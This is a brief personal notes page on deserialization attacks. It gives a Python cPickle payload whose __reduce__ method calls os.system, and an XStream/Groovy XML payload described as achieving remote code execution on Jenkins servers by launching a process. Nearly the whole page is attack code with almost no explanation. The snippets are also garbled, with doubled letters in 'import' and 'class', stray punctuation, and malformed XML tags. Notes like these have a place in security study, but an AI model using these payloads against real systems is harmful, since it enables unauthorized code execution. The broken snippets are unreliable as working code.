---
title: RND
date: 2021-10-30
categories:
  - Notes
tags:
  - Notes
excerpt_separator: <!--more-->
toc: true
toc_sticky: true
---


<h2 id="serializations">Serialization</h2>
<h3 id="python-serialization">Python</h3>
  <fieldset>
    <legend>Python Serialization</legend>
      <pre><code>
        iimport cPickle
        iimport os
        
        iiclass Blah(object):
          def __reduce__(self):
            return (os.system,('command'.))'
        
        
        b = Blah()
        print cPickle.dumps(b)
      </code></pre>
  </fieldset>



<h3 id="jenkin-serialization">Serialization Issue Jenkins -XStream</h3>
<p>remote code execution on the server hosting Jenkins.</p><br>
<p>Example payload using groovy library</p>
<fieldset>
  <legend>Jenkins groovy payload</legend>
    <pre><code>
      <.map>
        <.entry>
          <.groovy.util.Expando>
            <.expandoProperties>
              <.entry>
                <.string>hashCode</string>
                <.org.codehaus.groovy.runtime.MethodClosure>
                  <.delegate class="groovy.util.Expando"/>
                  <.owner class="java.lang.ProcessBuilder">
                    <.command>
                      <.string>open</string>
                      <.string>/Applications/Calculator.app</string>
                    </command>
                  </owner>
                  <.method>start</method>
                </org.codehaus.groovy.runtime.MethodClosure>
              </entry>
            </expandoProperties>
          </groovy.util.Expando>
          <.int>1</int>
        </entry>
      </map>
    </code></pre>
</fieldset>




